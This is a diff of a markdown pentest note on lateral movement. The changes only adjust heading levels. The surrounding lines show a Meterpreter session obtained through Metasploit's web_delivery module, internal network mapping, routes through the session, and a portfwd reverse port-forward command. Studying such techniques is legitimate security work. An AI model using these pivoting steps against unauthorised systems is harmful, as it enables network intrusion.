@@ -1,6 +1,6 @@
 # lateral -movement
 
-### metasploit
+## metasploit
 
 get a shell on windows 10 machine. here is an example:
 
@@ -36,14 +36,14 @@ msf6 exploit(multi/script/web_delivery) > sessions -i 1
 meterpreter > 
 ```
 
-### basic network mapping using built-in windows commands
+## basic network mapping using built-in windows commands
 
 ```
 meterpreter > ipconfig
 meterpreter > arp -a
 ```
 
-### set up routes on metasploit
+## set up routes on metasploit
 
 On msf5:
 
@@ -87,14 +87,9 @@ IPv4 Active Routing Table
    192.168.16.0       255.255.255.0      Session 1
 ```
 
-### more advanced network mapping
+## more advanced network mapping
 
-```
-```
-
-
-
-### reverse port forwarding
+## reverse port forwarding
 
 ```bash
 meterpreter > portfwd add -R -p <local-listening-port> -l <port-to-forward-to> -L <IP-to-forward-to>  
